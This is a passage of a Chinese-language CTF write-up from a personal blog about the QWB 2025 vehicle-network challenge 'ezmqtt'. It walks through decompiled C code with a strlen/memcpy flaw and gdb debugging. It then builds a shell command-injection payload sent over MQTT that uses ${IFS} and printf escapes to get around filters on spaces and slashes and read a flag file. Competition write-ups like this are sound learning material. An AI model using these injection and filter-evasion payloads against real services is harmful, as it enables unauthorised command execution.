+    <span class="token function">memcpy</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> buflen<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 复制命令字符串到全局空间</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">"index_html"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token comment">// 如果用户输入的目的文件不是 index.html（index_html），则不执行任何 popen</span>
+    <span class="token punctuation">&#123;</span>
+      stream <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 执行 shell</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> stream <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          fbuf<span class="token punctuation">[</span><span class="token function">strcspn</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> fbuf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
+          <span class="token punctuation">&#123;</span>
+            <span class="token function">msgsend</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 将读取到的内容返回至 HTTP 主题下</span>
+            <span class="token function">memset</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// ！！！恢复栈空间但是没有恢复全局 bss 变量！！！</span>
+          <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">pclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token keyword">else</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token function">msgsend</span><span class="token punctuation">(</span><span class="token string">"403"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"fault2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"fault"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"404"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>（格式化字符串直接问的 ai，不然实在是看不懂）</p>
+<ul>
+<li><code>%63[...]</code>：<strong>扫描集</strong>，读取最多 63 个字符，存入参数，并自动补 <code>\0</code>。</li>
+<li><code>[^...]</code>：<code>^</code> 在 <code>[</code> 后表示 <strong>取反</strong>，即读取“不属于这些字符”的字符。</li>
+<li><code>%*...</code>：<code>*</code> 表示 <strong>抑制赋值</strong>，匹配但丢弃，不写入参数，也不计入 <code>sscanf</code> 返回值。</li>
+</ul>
+<p>本质上和 http 差不多，只不过加了一些限制条件，例如路径后面不能再出现空格、<code>/</code>、<code>.</code> 等字符。<br>问题出现在 <code>strlen</code> 和 <code>memcpy</code> 这两个函数的使用上。<br><strong><code>strlen</code> 并不将空字符计入，这样导致 <code>memcpy</code> 无法复制到空字符。</strong><br>也就是说，因为无法通过空字符截断之前的输入，通过多次调用这个函数，可以实现构造特定 shell 命令的效果。</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>因为只有输入 <code>index.html</code> 才能触发 <code>popen</code>，所以要先构造一段占位符来填充需要的内容。例如：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;home&#x2F;ctf&#x2F;AAAAAAAAAA;cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>注意，因为会在调用 <code>sscanf</code> 时截断空格，且在后续也会截断替换 <code>/</code>，所以需要替换成转义字符。</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;home&#x2F;ctf&#x2F;AAAAAAAAAA;cat$&#123;IFS&#125;$&#123;PATH:0:1&#125;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此处并不是最终形式。为什么，等会往下看就知道了。先解释两个：</p>
+<ul>
+<li><code>$&#123;IFS&#125;</code> 空格（包括空格、制表符等符号）</li>
+<li><code>$&#123;PATH:0:1&#125;</code> 此处代表 <code>/</code></li>
+</ul>
+<p>gdb 断点命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">b *$rebase(0x1925)
+b *$rebase(0x1974)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>通过 mqttx 发送消息，断下点后查看内存情况：<br>发送第一段数据 <code>GET /home/ctf/AAAAAAAAAA;cat$&#123;IFS&#125;$&#123;PATH:0:1&#125;flag</code>：<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/7.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">fault2
+Message arrived
+     topic: HTTP
+   message: GET &#x2F;home&#x2F;ctf&#x2F;AAAAAAAAAA;cat$&#123;IFS&#125;$&#123;PATH:0:1&#125;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发送第二段数据 <code>GET /home/ctf/index.html</code>：<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/8.png"></p>
+<p>会发现似乎构造成功了，<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/9.png"></p>
+<p>但是执行 <code>popen</code> 时：</p>
+<pre class="line-numbers language-none"><code class="language-none">sh: 1: Bad substitution
+Message arrived
+     topic: HTTP
+   message: GET &#x2F;home&#x2F;ctf&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为什么？注意到 gdb 输出信息：</p>
+<pre class="line-numbers language-none"><code class="language-none">[Detaching vfork parent process 14136 after child exec]
+[Inferior 1 (process 14136) detached]
+process 14141 is executing new program: &#x2F;usr&#x2F;bin&#x2F;dash
+[Thread debugging using libthread_db enabled]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>会发现，<code>popen</code> 调用的 shell 和我们平常用的 shell 并不同，其调用的是 <code>/bin/sh</code> &#x2F; <code>dash</code> shell，而这个 shell 是没有 <code>$&#123;PATH:0:1&#125;</code> 这种说法的，于是就报错 <code>sh: 1: Bad substitution</code> 了。（这一段还是问 ai 才了解到的）<br>那要怎么做呢？很简单：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;home&#x2F;ctf&#x2F;AAAAAAAAAA;cat$&#123;IFS&#125;$(printf$&#123;IFS&#125;\\57)flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>通过这个 <code>$(printf&#123;$IFS&#125;\\57)</code> 语法自动生成一个斜杠。注意是两个反斜杠。<br><strong>重启 broker 和题目之后</strong> 运行：</p>
+<pre class="line-numbers language-none"><code class="language-none">fault2
+Message arrived
+     topic: HTTP
+   message: GET &#x2F;home&#x2F;ctf&#x2F;AAAAAAAAAA;cat$&#123;IFS&#125;$(printf$&#123;IFS&#125;\\57)flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/10.png"></p>
+<p><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/11.png"></p>
+<p>会发现 mqtt 成功返回了 flag：<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/12.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>mqtt + （http）+ 字符串函数的不正确使用。</p>
+<p>在清电脑的时候无意间发现这个题目，上网搜索 wp 没搜到，其实已经忘了当时是什么样的情形了（线上赛？线下赛？），本地只能做到这个水平了。</p>
+<p>gdb 动调的时候也发现一些小问题，比如中断一会之后就自动掉线了，只能从头开始再调试。在 mosquitto 配置文件里面设置超时时间还语法报错。<br>但是后面发现可能题目本身就限制了超时时间。</p>
+<p><del>（还有 <code>babymqtt</code> go 语言完全看不懂，以后再填坑吧嘻嘻）</del> 已填坑</p>
+
+    </div>
+  </div>
+
+  
+    
+  <div class="sea-prev-next-wrapper">
+    
+      <div class="prev">
+        <svg t="1725418977480" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4239" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="4240"></path></svg>
+        <a class="link" href="/2026/09/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-babymqtt/">
+          强网杯2025车联网赛道-babymqtt
+        </a>
+      </div>
+    
+    
+      <div class="next">
+        <a class="link" href="/2025/12/20/silverfox-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/">
+          silverfox #2: 对一份样本的浅分析（有待完善）
+        </a>
+        <svg t="1725418993065" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="6832" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M731.733333 480l-384-341.333333c-17.066667-14.933333-44.8-14.933333-59.733333 4.266666-14.933333 17.066667-14.933333 44.8 4.266667 59.733334L640 512 292.266667 821.333333c-17.066667 14.933333-19.2 42.666667-4.266667 59.733334 8.533333 8.533333 19.2 14.933333 32 14.933333 10.666667 0 19.2-4.266667 27.733333-10.666667l384-341.333333c8.533333-8.533333 14.933333-19.2 14.933334-32s-4.266667-23.466667-14.933334-32z" p-id="6833"></path></svg>
+      </div>
+    
+  </div>
+
+  
+</article>
+
+
+
+<script defer>
+  document.addEventListener('DOMContentLoaded', function () {
+    const toggleIcon = document.querySelector('.sea-article-catalog-title .sea-svg-icon');
+    const tocContent = document.querySelector('.sea-article-catalog > .toc');
+    if (toggleIcon && tocContent) {
+      toggleIcon.addEventListener('click', function () {
+        tocContent.classList.toggle('sea-article-catalog-show');
+        toggleIcon.classList.toggle('sea-svg-icon-rotate');
+      });
+    }
+  });
+</script>
+  </main>
+  <footer id="sea-footer-container">
+  <div class="sea-footer-row">
+    <div class="sea-footer-menu-link">
+      
+        <a
+          class="sea-footer-link"
+          
+            target="_blank"
+          
+          href="https://github.com/shanzade"
+        >
+          GitHub
+        </a>
+        <span class="sea-footer-link__dot">·</span>
+      
+    </div>
+  </div>
+  
+  
+  
+  <div class="sea-footer-row">
+    <div class="sea-footer-copyright">
+      <span>©</span>
+      
+        2026
+      
+      <span>·</span>
+      shanza
+    </div>
+    <span class="split-line">|</span>
+    <div class="sea-footer-theme-by">
+      Theme by <a class="theme" href="https://github.com/hai-zou/hexo-theme-sea" target="_blank">Sea</a>
+    </div>
+  </div>
+</footer>
+
+  
+
+
+<script src="/js/main.js" defer></script>
+
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
